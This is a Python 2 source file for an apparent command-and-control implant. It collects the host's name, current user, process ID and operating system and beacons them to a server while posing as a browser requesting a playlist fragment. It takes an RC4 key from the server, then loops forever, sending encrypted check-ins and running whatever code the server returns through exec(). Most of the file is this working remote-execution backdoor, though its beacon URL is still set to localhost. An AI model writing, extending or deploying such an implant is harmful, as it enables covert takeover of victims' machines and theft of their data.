import base64
import getpass
import json
import os
import platform
import random
import socket
import string
import sys
import time
import urllib
import urllib2


# TO DO: Remove hard-coded value
beacon_url = "http://127.0.0.1/api/v1/playlist/getFragment"

# TO DO: Remove hard-coded value
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"

# TO DO: Add in sleep interval jitter
sleep_interval = 5


def crypt(key, data):
    S = range(256)
    j = 0
    out = []

    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0

    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))

    return "".join(out)


def initial_beacon(hostname, current_user, process_id, operating_system):
    try:
        post_data = {
            "h": hostname,
            "u": current_user,
            "p": process_id,
            "o": operating_system
        }

        request = urllib2.Request(beacon_url, data=base64.b64encode(json.dumps(post_data)))
        request.add_header("User-Agent", user_agent)
        request.add_header("Content-Type", "application/json")
        f = urllib2.urlopen(request)
        response = f.read()
        print response
        return response

    except:
        pass


def rc4_beacon(key, hostname, current_user, process_id, operating_system):
    try:
        post_data = {
            "hostname": hostname,
            "current_user": current_user,
            "process_id": process_id,
            "operating_system": operating_system
        }

        request = urllib2.Request(beacon_url, data=crypt(key, json.dumps(post_data)))
        request.add_header("User-Agent", user_agent)
        request.add_header("Content-Type", "application/json")
        f = urllib2.urlopen(request)
        response = f.read()
        print response
        return response

    except:
        pass


if __name__ == "__main__":
    counter = 0

    if "Darwin" in platform.system():
        operating_system = "Mac OS X " + platform.mac_ver()[0]

    else:
        operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]

    hostname = socket.gethostname()
    current_user = getpass.getuser()
    process_id = os.getpid()

    while True:
        if counter == 0:
            key = base64.b64decode(initial_beacon(hostname, current_user, process_id, operating_system))

        else:
            try:
                exec(rc4_beacon(key, hostname, current_user, process_id, operating_system))

            except:
                pass

        counter += 1
        time.sleep(sleep_interval)
